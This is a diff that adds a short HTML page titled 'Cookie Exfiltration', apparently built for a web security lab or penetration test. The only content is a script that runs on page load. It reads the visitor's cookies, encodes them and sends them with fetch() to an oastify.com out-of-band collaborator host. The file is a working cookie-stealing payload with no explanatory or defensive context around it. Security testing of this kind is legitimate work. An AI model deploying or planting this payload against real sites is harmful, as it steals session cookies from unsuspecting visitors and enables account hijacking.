@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Exfiltration</title>
+    <script type="text/javascript">
+        window.onload = function() {
+            let cookie = document.cookie;
+            let encodedCookie = encodeURIComponent(cookie);
+            fetch("http://rd8c5sfn3lhgu80agigt7uqkqbw2kv8k.oastify.com/exfil?data=" + encodedCookie);
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
